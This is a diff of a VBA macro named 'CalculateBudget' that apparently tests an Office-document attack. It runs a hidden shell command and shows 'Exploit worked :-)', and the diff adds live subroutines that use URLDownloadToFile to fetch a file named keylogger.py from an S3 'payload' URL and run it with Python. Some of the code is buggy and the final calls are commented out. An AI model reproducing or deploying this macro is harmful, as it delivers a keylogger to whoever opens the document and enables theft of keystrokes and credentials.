@@ -1,34 +1,54 @@
+Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
+(ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, _
+ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
 Sub CalculateBudget()
 
-    Url = "google.com"
+    url = "google.com"
         
     Dim shell
     Set shell = CreateObject("wscript.shell")
-    result = shell.Run("ping " & Url, 0, True)
+    result = shell.Run("ping " & url, 0, True)
 
-'Download Python Script
-'strCommand = "invoke-webrequest -Uri "https://pub6075.s3.ap-southeast-1.amazonaws.com/payload/keylogger.py" -OutFile "C:\keylogger.py" -UseDefaultCredentials
-'Set WsShell = CreateObject("WScript.Shell")
-'WsShell.Run (strCommand)
-
-'Declare Variables
-'Dim objShell As Object
-'Dim PythonExe, PythonScript As String
-
-' Object shell.
-'Set objShell = VBA.CreateObject("Wscript.Shell")
-
-' Define path to python exe and script
-'PythonExe = """C:\Program Files (x86)\Microsoft Visual Studio\Shared\Python36_64\python.exe"""
-'PythonScriptLoad = "C:\loader.py"
-'PythonScriptRun = "C:\keylogger.py"
-
-'Run the Python Script
-'objShell.Run PythonExe & PythonScript
 
     If result = 0 Then
-        MsgBox "Contacted " & Url & ". Exploit worked :-)"
+        
+        MsgBox "Contacted " & url & ". Exploit worked :-)"
     End If
+    
+    'DownloadPython
+    'runPython
+End Sub
+
+Sub DownloadPython()
+    Dim DownloadStatus As Variant
+    Dim url As String
+    Dim LocalPath As String
+    
+    url = "https://pub6075.s3.ap-southeast-1.amazonaws.com/payload/keylogger.py"
+    LocalPath = "C:" & keylogger.py
+    DownloadStatus = URLDownloadToFile(0, url, LocalPath, 0, 0)
+    
+    If DownloadStatus = 0 Then
+        MsgBox "Download Status : Success"
+        Else
+        MsgBox "Download Status : Failed"
+
+End Sub
+    
+Sub runPython()
+    'Declare Variables
+    Dim objShell As Object
+    Dim PythonExe, PythonScript As String
+
+    ' Object shell.
+    Set objShell = VBA.CreateObject("Wscript.Shell")
+
+    ' Define path to python exe and script
+    PythonExe = """C:\Program Files (x86)\Microsoft Visual Studio\Shared\Python36_64\python.exe"""
+    PythonScriptRun = "C:" & DownloadFile '
+
+    'Run the Python Script
+   objShell.Run PythonExe & PythonScript
 
 End Sub
 
